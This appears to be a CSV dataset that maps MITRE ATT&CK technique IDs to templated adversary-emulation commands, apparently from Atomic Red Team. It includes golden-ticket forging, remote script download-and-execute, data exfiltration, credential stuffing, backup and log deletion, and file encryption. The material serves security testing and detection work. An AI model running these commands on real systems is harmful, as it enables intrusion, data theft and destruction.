mitre_id,command
T1105,"cmd /c ""pathtoatomicsfolder\..\externalpayloads\nimgrab.exe"" #{remote_file} #{destination_path}"
T1558,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden $filename = (get-childitem | ? {$_.name.startswith(""golden_"")} | sort-object -descending -property lastwritetime | select -first 1).name # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge cd %temp% ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile echo. echo requesting sysvol: dir \\$(#{domaincontroller})\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""kirbifile"", $filename | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1491,"$ORGLEGALNOTICECAPTION = (GET-ITEMPROPERTY HKLM:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM -NAME LEGALNOTICECAPTION).LEGALNOTICECAPTION $ORGLEGALNOTICETEXT = (GET-ITEMPROPERTY HKLM:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM -NAME LEGALNOTICETEXT).LEGALNOTICETEXT $NEWLEGALNOTICECAPTION = ""#{LEGAL_NOTICE_CAPTION}"" $NEWLEGALNOTICETEXT = ""#{LEGAL_NOTICE_TEXT}"" SET-ITEMPROPERTY HKLM:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM -NAME LEGALNOTICECAPTION -VALUE $NEWLEGALNOTICECAPTION -TYPE STRING -FORCE SET-ITEMPROPERTY HKLM:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM -NAME LEGALNOTICETEXT -VALUE $NEWLEGALNOTICETEXT -TYPE STRING -FORCE"
T1105,#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll #{curl_path} -k #{file_download} -o %temp%\allthethingsx64.dll
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1056,"mavinject $pid /injectrunning ""#{file_name}"" invoke-webrequest #{server_name} -usebasicparsing # id_9378"
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt   "
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }  "
T1112,"reg add ""hkey_local_machine\software\policies\microsoft\windows nt\terminal services"" /v ""disablesecuritysettings"" /t reg_dword /d 1 /f"
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f"
T1055,"""#{exe_binary}""   "
T1222,mkdir #{file_or_folder} >nul 2>&1 echo t1222.001_attrib1 >> #{file_or_folder}\t1222.001_attrib1.txt echo t1222.001_attrib2 >> #{file_or_folder}\t1222.001_attrib2.txt attrib.exe +h #{file_or_folder}\t1222.001_attrib1.txt attrib.exe +h #{file_or_folder}\t1222.001_attrib2.txt
T1490,bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no
T1016,test-netconnection -commontcpport http -computername #{target} # id_3066
T1048,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz # id_3401"
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }"
T1090,"osascript -e 'tell application ""terminal"" to do script ""tor""' # id_9487"
T1201,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domainpolicy -verbose
T1047,"wmic process get caption,executablepath,commandline /format:csv   "
T1040,sudo #{program_path} -f -i #{ifname} -t 3 # id_2708
T1110,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1197,bitsadmin.exe /create #{bits_job_name} bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file} bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} null bitsadmin.exe /resume #{bits_job_name} ping -n 5 127.0.0.1 >nul 2>&1 bitsadmin.exe /complete #{bits_job_name}   
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}  "
T1135,df -ah smbutil view -g //#{computer_name} showmount #{computer_name} # id_9884
T1070,unlink /var/log/messages
T1490,wbadmin delete catalog -quiet
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region # id_3102"
T1220,"""#{MSXSL_EXE}"" ""#{XMLFILE}"" ""#{XSLFILE}"""
T1564,"type c:\temp\evil.exe > ""c:\program files (x86)\teamviewer\teamviewer12_logfile.log:evil.exe"" extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe findstr /v /l w3alllov3donaldtrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1564.004/src/test.ps1 c:\temp:ttt makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab print /d:#{path}\file.txt:autoruns.exe #{path}\autoruns.exe reg export hklm\software\microsoft\evilreg #{path}\file.txt:evilreg.reg regedit /e #{path}\file.txt:regfile.reg hkey_current_user\mycustomregkey expand \\webdav\folder\file.bat #{path}\file.txt:file.bat esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o"
T1010,"C:\WINDOWS\MICROSOFT.NET\FRAMEWORK\V4.0.30319\CSC.EXE -OUT:#{OUTPUT_FILE_NAME} ""#{INPUT_SOURCE_CODE}"" #{OUTPUT_FILE_NAME}"
T1547,"copy-item ""$pathtoatomicsfolder\t1547.001\src\batstartup.bat"" ""$env:appdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" copy-item ""$pathtoatomicsfolder\t1547.001\src\batstartup.bat"" ""c:\programdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" start-process ""$env:appdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" start-process ""c:\programdata\microsoft\windows\start menu\programs\startup\batstartup.bat"""
T1020,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{}"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1529,SHUTDOWN /S /T #{TIMEOUT}
T1217,get-childitem -path c:\users\ -filter bookmarks -recurse -erroraction silentlycontinue -force
T1489,taskkill.exe /f /im #{process_name} # id_3622
T1574,"write-host 1.downloading keyscrambler from official website to temp directory invoke-webrequest -uri ""https://download.qfxsoftware.com/download/latest/keyscrambler_setup.exe"" -outfile $env:temp\keyscrambler_setup.exe write-host 2.installing keyscrambler with keyscrambler_setup.exe from temp directory start-process -filepath $env:temp\keyscrambler_setup.exe -argumentlist /s -wait write-host 3.copying keyscrambler.exe to temp folder,to avoid permission issues, which calls keyscramblerie.dll in cwd i.e. temp copy-item ""c:\program files (x86)\keyscrambler\keyscrambler.exe"" -destination $env:temp\keyscrambler.exe write-host 4.executing keyscrambler.exe, you should see a popup of missing keyscramblerie.dll, you can close this popup start-process -filepath $env:temp\keyscrambler.exe write-host 5.a modified keyscramblerie.dll can be copied to temp, which can be misused by attacker"
T1574,"c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /out:""$env:localappdata\microsoft\windowsapps\get-variable.exe"" ""pathtoatomicsfolder\t1574.008\bin\calc.cs"" powershell -noprofile "
T1574,"COPY %WINDIR%\SYSTEM32\AMSI.DLL %APPDATA%\AMSI.DLL REN %APPDATA%\AMSI.DLL WINAPPXRT.DLL COPY %APPDATA%\WINAPPXRT.DLL %WINDIR%\SYSTEM32\WINAPPXRT.DLL REG ADD ""HKEY_CURRENT_USER\ENVIRONMENT"" /V APPX_PROCESS /T REG_EXPAND_SZ /D ""1"" /F"
T1485,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"""
T1530,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } }   "
T1069,wmic group get name
T1105,RSYNC -R #{USERNAME}@#{REMOTE_HOST}:#{REMOTE_PATH} #{LOCAL_PATH}
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1204,"invoke-webrequest -outfile $env:temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/bin/test10.lnk"" $file1 = ""$env:temp\test10.lnk"" start-process $file1 start-sleep -s 10 taskkill /im a.exe /f  "
T1021,enable-psremoting -force invoke-command -computername $env:computername -scriptblock {whoami}
T1654,wevtutil enum-logs 
T1221,"START ""#{DOCX_FILE}"""
T1484,"REG ADD ""HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\SYSTEM"" /V GROUPPOLICYREFRESHTIMEDC /T REG_DWORD /D 0 /F REG ADD ""HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\SYSTEM"" /V GROUPPOLICYREFRESHTIMEOFFSETDC /T REG_DWORD /D 0 /F REG ADD ""HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\SYSTEM"" /V GROUPPOLICYREFRESHTIME /T REG_DWORD /D 0 /F REG ADD ""HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\SYSTEM"" /V GROUPPOLICYREFRESHTIMEOFFSET /T REG_DWORD /D 0 /F REG ADD ""HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\SYSTEM"" /V ENABLESMARTSCREEN /T REG_DWORD /D 0 /F REG ADD ""HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\SYSTEM"" /V SHELLSMARTSCREENLEVEL /T REG_SZ /D BLOCK /F"
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""cscript.exe #{jse_path}`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1053,"SCHTASKS /CREATE /S #{TARGET} /RU #{USER_NAME} /RP #{PASSWORD} /TN ""ATOMIC TASK"" /TR ""#{TASK_COMMAND}"" /SC DAILY /ST #{TIME}"
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1496,yes > /dev/null
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1218,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /u `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_uninstall_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil uninstall method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1001,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh"
T1021,"copy c:\windows\system32\calc.exe 'c:\users\#{user}\appdata\local\microsoft\windowsapps\foxprow.exe' $com = [system.activator]::createinstance([type]::gettypefromprogid(""excel.application"",""#{computer_name}"")) $com.activatemicrosoftapp(""5"")"
T1119,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1140,"encoded=$(echo '#{message}' | base64) printf $encoded | base64 -d echo $encoded | base64 -d echo $(echo $encoded) | base64 -d echo $encoded > #{encoded_file} && base64 -d #{encoded_file} echo $encoded > #{encoded_file} && base64 -d < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | base64 -d echo $encoded > #{encoded_file} && cat < #{encoded_file} | base64 -d bash -c ""{echo,\""$(echo $encoded)\""}|{base64,-d}"""
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close() # id_4760"
T1505,new-webglobalmodule -name #{module_name} -image #{dll_path}   
T1201,get-addefaultdomainpasswordpolicy # id_5864
T1059,"cmd /r cmd<""#{input_file}"""
T1071,"INVOKE-WEBREQUEST #{DOMAIN} -USERAGENT ""HTTPBROWSER/1.0"" | OUT-NULL INVOKE-WEBREQUEST #{DOMAIN} -USERAGENT ""WGET/1.9+CVS-STABLE (RED HAT MODIFIED)"" | OUT-NULL INVOKE-WEBREQUEST #{DOMAIN} -USERAGENT ""OPERA/8.81 (WINDOWS NT 6.0; U; EN)"" | OUT-NULL INVOKE-WEBREQUEST #{DOMAIN} -USERAGENT ""*<|>*"" | OUT-NULL"
T1016,test-netconnection -computername #{target}
T1136,"useradd -g 0 -m -d /root -s /bin/bash #{username} if [ $(cat /etc/os-release | grep -i 'name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;"
T1489,net.exe stop #{service_name}
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js"
T1491,"$notepath = join-path $env:temp ""#{note_filename}"" $pidpath = join-path $env:temp ""#{pid_filename}"" $title = ""#{note_title}"" $body = ""#{note_body}"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'
T1606,"IMPORT-MODULE AADINTERNALS -FORCE $SAML = NEW-AADINTSAMLTOKEN -IMMUTABLEID ""#{IMMUTABLE_ID}"" -PFXFILENAME ""#{CERTIFICATE_PATH}"" -ISSUER ""#{ISSUER_URI}"" $CONN = GET-AADINTACCESSTOKENFORAADGRAPH -SAMLTOKEN $SAML -SAVETOCACHE IF ($CONN) { WRITE-HOST ""`NSUCCESSFULLY CONNECTED AS $($CONN.USER)"" } ELSE { WRITE-HOST ""`NTHE CONNECTION FAILED"" } WRITE-HOST ""END OF GOLDEN SAML"""
T1486,which_openssl=`which openssl` $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path} # id_6724
T1202,forfiles /p c:\windows\system32 /m notepad.exe /c #{process} # id_2494
T1037,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_agent.plist /library/startupitems/atomic.sh start # id_5852
